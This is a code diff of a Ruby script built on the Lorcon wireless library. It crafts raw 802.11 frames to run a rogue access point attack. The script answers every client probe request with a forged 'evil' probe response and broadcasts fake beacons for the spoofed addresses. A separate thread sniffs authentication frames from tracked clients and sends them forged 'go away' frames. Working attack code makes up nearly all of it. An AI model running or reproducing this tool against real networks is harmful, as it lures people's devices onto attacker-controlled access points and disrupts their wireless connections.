@@ -23,21 +23,48 @@ $evil_probe_response = Dot11.new(
                         :type =>      0x0,
                         :version =>   0x0,
                         :flags =>     0x0,
-                        :duration =>  0x0000,
+                        :duration =>  0x013a,
                         :addr1 =>     0,
                         :addr2 =>     0,
                         :addr3 =>     0,
                         :sc =>        0x0000) /
-                        Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x6400, :capabilities => 0x2100) /
+                        Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x0064, :capabilities => 0x0100) /
                           Dot11Elt.new(
-                            :id =>           0x00,
-                            :info_length =>  4,
-                            :info =>         "goat") /
+                            :id =>            0x00,
+                            :info_length =>   4,
+                            :info =>          "baad") /
                           Dot11Elt.new(
-                            :id =>           0x01,
-                            :info_length =>  0x08,
-                            :info =>         [0x82, 0x84, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24].pack("c*"))
-                            
+                            :id =>            0x01,
+                            :info_length =>   0x04,
+                            :info =>          [0x82, 0x84, 0x0b, 0x16].pack("c*")) /
+                          Dot11Elt.new(
+                            :id =>            0x03,
+                            :info_length =>   0x01,
+                            :info =>          [0x0b].pack("c*"))
+
+$beacon = Dot11.new(:type     => 0x0,
+                    :subtype  => 0x8,
+                    :version  => 0x0,
+                    :flags    => 0x0,
+                    :duration => 0x0,
+                    :addr1    => "ff:ff:ff:ff:ff:ff",
+                    :addr2    => "ba:aa:ad:f0:00:0d",
+                    :addr3    => "ba:aa:ad:f0:00:0d",
+                    :sc       => 0x0000) /
+          Dot11ProbeResp.new(:timestamp => 0, :beacon_interval => 0x0064, :capabilities => 0x0100) /
+          Dot11Elt.new(
+            :id =>            0x00,
+            :info_length =>   4,
+            :info =>          "baad") /
+          Dot11Elt.new(
+            :id =>            0x01,
+            :info_length =>   0x04,
+            :info =>          [0x82, 0x84, 0x0b, 0x16].pack("c*")) /
+          Dot11Elt.new(
+            :id =>            0x03,
+            :info_length =>   0x01,
+            :info =>          [0x0b].pack("c*"))
+
 $go_away = Dot11.new(
              :subtype =>  0x1,
              :type =>     0x0,
@@ -64,39 +91,53 @@ end
 
 @device = Lorcon::Device.new("ath0", "madwifing", 1)
 
-=begin
-emitter = Thread.new do
-    while (true)
-      emit $evil_probe_response.data
-      sleep(0.01)
-    end
+  #else
+  #  if packet.addr1[0] != 0xff && $clients[packet.addr2] == packet.addr1
+  #    if packet.subtype == 11
+  #      $go_away.addr1 = packet.addr2
+  #      $go_away.addr2 = packet.addr1
+  #      $go_away.addr3 = packet.addr1
+  #      
+  #      emit $go_away.data
+  #    end
+  #  end
+  #end
+
+Thread.new do
+  sniff :device => 'ath0', :filter => 'wlan[0] == 0xb0' do |packet|
+    next unless $clients[packet.addr2] == packet.addr1
+    
+    $go_away.addr1 = packet.addr2
+    $go_away.addr2 = packet.addr1
+    $go_away.addr3 = packet.addr1
+
+    emit $go_away.data
+    
+    puts "telling #{packet.addr2} to go away with #{packet.addr1}!"
+  end
 end
-=end
 
-sniff "ath0" do |packet|
-  if packet.type == 0 && packet.subtype == 4 #&& packet.payload.elements_by_id[0].essid == "goat"
+Thread.new do
+  while true
+    $clients.each do |blah, ap_address|
+      $beacon.addr2 = ap_address
+      $beacon.addr3 = ap_address
+      emit $beacon.data
+    end
+    sleep 1
+  end
+end
 
-    puts "responding to probe request from #{packet.addr2}!"
-    
+sniff :device => 'ath0', :filter => 'wlan[0] == 0x40' do |packet|
     ap_address = $clients[packet.addr2] || generate_address($clients.size)
-    
+
     $evil_probe_response.addr1 = packet.addr2
     $evil_probe_response.addr2 = ap_address
     $evil_probe_response.addr3 = ap_address
-    $evil_probe_response.payload.timestamp = (Time.now.to_f * 1000000).to_i
+    $evil_probe_response.payload.timestamp = (Time.now.to_f * 100).to_i
     
     emit $evil_probe_response.data
     
+    puts "responding to probe request from #{packet.addr2} with #{ap_address}!"
     $clients[packet.addr2] = ap_address
-  else
-    if packet.addr1[0] != 0xff && $clients[packet.addr2] == packet.addr1
-      if packet.subtype == 11
-        $go_away.addr1 = packet.addr2
-        $go_away.addr2 = packet.addr1
-        $go_away.addr3 = packet.addr1
-        
-        emit $go_away.data
-      end
-    end
-  end
 end
